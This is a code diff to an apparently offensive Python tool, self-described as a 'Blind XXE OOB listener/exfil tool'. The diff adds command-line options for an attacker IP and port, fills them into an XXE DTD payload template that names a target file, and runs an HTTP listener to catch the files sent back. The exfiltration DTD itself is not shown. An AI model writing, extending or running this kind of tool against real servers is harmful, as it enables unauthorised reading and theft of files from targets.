@@ -1,3 +1,4 @@
+import argparse
 import threading
 import time
 from cmd import Cmd
@@ -10,19 +11,34 @@ from rich.console import Console
 from rich.panel import Panel
 from rich.text import Text
 
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="Blind XXE OOB listener/exfil tool")
+    parser.add_argument(
+        "-l", "--lhost", required=True, help="Attacker IP for the OOB callback URL"
+    )
+    parser.add_argument(
+        "-p", "--lport", type=int, default=8000, help="Port to listen on (default: 8000)"
+    )
+    parser.add_argument(
+        "-r", "--req", default="xxe.req", help="Path to the raw request file (default: xxe.req)"
+    )
+    return parser.parse_args()
+
+
+args = parse_args()
+
 console = Console()
 
 payload = "Dummy string"
 decoded = "Dummy string"
-REQ_FILE = "xxe.req"
+REQ_FILE = args.req
 
 # Some XML parsers resolve the OOB parameter entity twice for a single
 # request (once loading the DTD, once expanding it), producing two
 # identical requests within milliseconds. Suppress the repeat print.
 DEDUPE_WINDOW = 2  # seconds
 _seen_content: dict[str, float] = {}
-
-# TODO Add argparse to get the .req filename dynamically, and also the attacker's IP and port for the OOB request
 
 
 def load_request(path=REQ_FILE):
@@ -114,7 +130,12 @@ class Terminal(Cmd):
 
         # To update the xxe with the user required file dynamically
         with open("xxe.dtd") as f:
-            temp_payload = f.read().replace("{line}", line)
+            temp_payload = (
+                f.read()
+                .replace("{line}", line)
+                .replace("{lhost}", args.lhost)
+                .replace("{lport}", str(args.lport))
+            )
 
         payload = temp_payload
         console.print(f"[cyan]Target file set:[/cyan] {line}")
@@ -125,7 +146,7 @@ class Terminal(Cmd):
 
 
 def run():
-    server_address = ("", 8000)
+    server_address = ("", args.lport)
     httpd = http.server.HTTPServer(server_address, RequestHandler)
     httpd.serve_forever()
 
